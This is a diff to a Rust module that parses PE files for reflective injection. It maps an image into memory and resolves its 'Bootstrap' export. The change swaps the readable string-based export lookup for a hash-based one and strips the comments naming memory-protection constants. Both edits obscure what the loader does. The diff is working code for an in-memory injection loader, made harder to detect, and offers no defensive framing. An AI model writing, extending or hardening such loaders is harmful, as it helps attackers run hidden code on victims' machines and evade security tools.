@@ -1,5 +1,7 @@
 //! Minimal PE parser for reflective injection.
 
+use crate::hash::{export_rva_by_hash, H_BOOTSTRAP};
+
 pub struct PeImage {
     pub size_of_image: usize,
     pub size_of_headers: usize,
@@ -9,7 +11,6 @@ pub struct PeImage {
 
 const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
 const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
-const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;
 
 #[repr(C)]
 struct ImageDosHeader {
@@ -37,7 +38,7 @@ struct ImageOptionalHeader64 {
     _size_of_code: u32,
     _size_of_initialized_data: u32,
     _size_of_uninitialized_data: u32,
-    address_of_entry_point: u32,
+    _address_of_entry_point: u32,
     _base_of_code: u32,
     image_base: u64,
     _section_alignment: u32,
@@ -60,7 +61,7 @@ struct ImageOptionalHeader64 {
     _size_of_heap_commit: u64,
     _loader_flags: u32,
     number_of_rva_and_sizes: u32,
-    data_directory: [ImageDataDirectory; 16],
+    _data_directory: [ImageDataDirectory; 16],
 }
 
 #[repr(C)]
@@ -71,7 +72,7 @@ struct ImageDataDirectory {
 
 #[repr(C)]
 struct ImageSectionHeader {
-    name: [u8; 8],
+    _name: [u8; 8],
     virtual_size: u32,
     virtual_address: u32,
     size_of_raw_data: u32,
@@ -81,21 +82,6 @@ struct ImageSectionHeader {
     _number_of_relocations: u16,
     _number_of_linenumbers: u16,
     characteristics: u32,
-}
-
-#[repr(C)]
-struct ImageExportDirectory {
-    _characteristics: u32,
-    _time_date_stamp: u32,
-    _major_version: u16,
-    _minor_version: u16,
-    _name: u32,
-    _base: u32,
-    number_of_functions: u32,
-    number_of_names: u32,
-    address_of_functions: u32,
-    address_of_names: u32,
-    address_of_name_ordinals: u32,
 }
 
 pub fn parse_pe(data: &[u8]) -> Option<PeImage> {
@@ -131,7 +117,7 @@ pub fn parse_pe(data: &[u8]) -> Option<PeImage> {
         return None;
     }
 
-    let bootstrap_rva = export_rva(data, opt, "Bootstrap")?;
+    let bootstrap_rva = export_rva_by_hash(data, H_BOOTSTRAP)?;
 
     Some(PeImage {
         size_of_image: opt.size_of_image as usize,
@@ -139,46 +125,6 @@ pub fn parse_pe(data: &[u8]) -> Option<PeImage> {
         preferred_base: opt.image_base,
         bootstrap_rva,
     })
-}
-
-fn export_rva(data: &[u8], opt: &ImageOptionalHeader64, name: &str) -> Option<u32> {
-    let dir = &opt.data_directory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-    if dir.virtual_address == 0 || dir.size == 0 {
-        return None;
-    }
-    let exp = read_at::<ImageExportDirectory>(data, dir.virtual_address)?;
-    let names_rva = exp.address_of_names;
-    let ordinals_rva = exp.address_of_name_ordinals;
-    let functions_rva = exp.address_of_functions;
-
-    for i in 0..exp.number_of_names {
-        let name_rva = read_at::<u32>(data, names_rva + i * 4)?;
-        let export_name = read_cstr(data, name_rva)?;
-        if export_name != name {
-            continue;
-        }
-        let ordinal = read_at::<u16>(data, ordinals_rva + i * 2)? as u32;
-        return read_at::<u32>(data, functions_rva + ordinal * 4);
-    }
-    None
-}
-
-fn read_at<T: Copy>(data: &[u8], rva: u32) -> Option<T> {
-    let off = rva as usize;
-    if off + std::mem::size_of::<T>() > data.len() {
-        return None;
-    }
-    Some(unsafe { *(data.as_ptr().add(off) as *const T) })
-}
-
-fn read_cstr(data: &[u8], rva: u32) -> Option<&str> {
-    let off = rva as usize;
-    if off >= data.len() {
-        return None;
-    }
-    let tail = &data[off..];
-    let end = tail.iter().position(|&b| b == 0)?;
-    std::str::from_utf8(&tail[..end]).ok()
 }
 
 pub fn build_mapped_image(pe: &[u8], size_of_image: usize) -> Option<Vec<u8>> {
@@ -218,11 +164,11 @@ pub fn section_protection(characteristics: u32) -> u32 {
     const READ: u32 = 0x4000_0000;
     const WRITE: u32 = 0x8000_0000;
     match (characteristics & EXEC != 0, characteristics & READ != 0, characteristics & WRITE != 0) {
-        (true, _, true) => 0x40,   // PAGE_EXECUTE_READWRITE
-        (true, _, false) => 0x20,  // PAGE_EXECUTE_READ
-        (false, _, true) => 0x04,   // PAGE_READWRITE
-        (false, true, false) => 0x02, // PAGE_READONLY
-        _ => 0x01,                 // PAGE_NOACCESS
+        (true, _, true) => 0x40,
+        (true, _, false) => 0x20,
+        (false, _, true) => 0x04,
+        (false, true, false) => 0x02,
+        _ => 0x01,
     }
 }
 
